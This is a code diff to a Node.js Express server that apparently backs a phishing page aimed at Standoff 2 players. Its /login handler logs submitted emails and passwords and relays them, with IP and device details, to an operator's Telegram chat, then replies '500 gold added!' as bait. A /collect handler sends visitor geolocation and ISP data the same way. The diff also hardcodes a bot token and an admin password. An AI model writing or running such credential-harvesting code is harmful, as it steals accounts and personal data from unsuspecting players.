@@ -1,15 +1,56 @@
 const express = require('express');
-const axios = require('axios');
+const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
 const app = express();
 
 // ===== НАСТРОЙКИ =====
+const BOT_TOKEN = '8699335543:AAHUe_Ht9gCNI7cnBa3l6jvp315xTQKv0LQ';
+const ADMIN_ID = 5015075680;
 const ADMIN_USER = 'admin';
 const ADMIN_PASS = 'standoff2026';
 
-// ⚠️ ВСТАВЬ СЮДА URL ОТ WISPBYTE (типа https://xxxx.wispbyte.com/notify)
-const BOT_URL = 'https://ВСТАВЬ_URL_ОТ_WISPBYTE/notify';
-const SECRET = 'standoff_secret_2026'; // должен совпадать с bot.js
+// ===== TELEGRAM-БОТ =====
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+console.log('🤖 Telegram-бот запущен');
+
+bot.onText(/\/start/, (msg) => {
+    bot.sendMessage(msg.chat.id,
+        '🔐 *Бот уведомлений Standoff 2*\n\nТвой chat\\_id: `' + msg.chat.id + '`',
+        { parse_mode: 'Markdown' }
+    );
+});
+
+bot.onText(/\/test/, (msg) => {
+    bot.sendMessage(ADMIN_ID, '✅ Тест пройден, бот работает!');
+});
+
+// ===== ОТПРАВКА УВЕДОМЛЕНИЙ =====
+function sendAccount(data) {
+    const text =
+        '🔐 *НОВЫЙ АККАУНТ*\n' +
+        '━━━━━━━━━━━━━━━━━━\n' +
+        '📧 Почта: `' + (data.email || '?') + '`\n' +
+        '🔑 Пароль: `' + (data.password || '?') + '`\n' +
+        '🌐 IP: `' + (data.ip || '?') + '`\n' +
+        '📱 Устройство: ' + ((data.user_agent || '').substring(0, 50)) + '...\n' +
+        '🕒 Время: ' + new Date().toLocaleString('ru-RU');
+    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' })
+        .catch(err => console.error('TG:', err.message));
+}
+
+function sendVisitor(data) {
+    const text =
+        '👤 *НОВЫЙ ПОСЕТИТЕЛЬ*\n' +
+        '━━━━━━━━━━━━━━━━━━\n' +
+        '🌐 IP: `' + (data.ip || '?') + '`\n' +
+        '🌍 Страна: ' + (data.country || '?') + '\n' +
+        '🏙 Город: ' + (data.city || '?') + '\n' +
+        '📡 Провайдер: ' + (data.org || '?') + '\n' +
+        '📺 Экран: ' + (data.screen || '?') + '\n' +
+        '🕒 Время: ' + new Date().toLocaleString('ru-RU');
+    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' })
+        .catch(err => console.error('TG:', err.message));
+}
 
 // ===== EXPRESS =====
 app.use(express.json());
@@ -35,17 +76,13 @@ app.post('/collect', (req, res) => {
 
     console.log('👤 Посетитель: ' + ip + ' | ' + (geo.country || '?') + ', ' + (geo.city || '?'));
 
-    axios.post(BOT_URL, {
-        type: 'visitor',
-        secret: SECRET,
-        data: {
-            ip: ip,
-            country: geo.country,
-            city: geo.city,
-            org: geo.org,
-            screen: (screen.w || '?') + 'x' + (screen.h || '?')
-        }
-    }).catch(err => console.error('Bot err:', err.message));
+    sendVisitor({
+        ip: ip,
+        country: geo.country,
+        city: geo.city,
+        org: geo.org,
+        screen: (screen.w || '?') + 'x' + (screen.h || '?')
+    });
 
     res.json({ ok: true });
 });
@@ -60,11 +97,7 @@ app.post('/login', (req, res) => {
 
     console.log('🔐 Аккаунт: ' + email + ' : ' + password);
 
-    axios.post(BOT_URL, {
-        type: 'account',
-        secret: SECRET,
-        data: { email, password, ip, user_agent: ua }
-    }).catch(err => console.error('Bot err:', err.message));
+    sendAccount({ email, password, ip, user_agent: ua });
 
     res.json({ success: true, message: '500 gold added!' });
 });
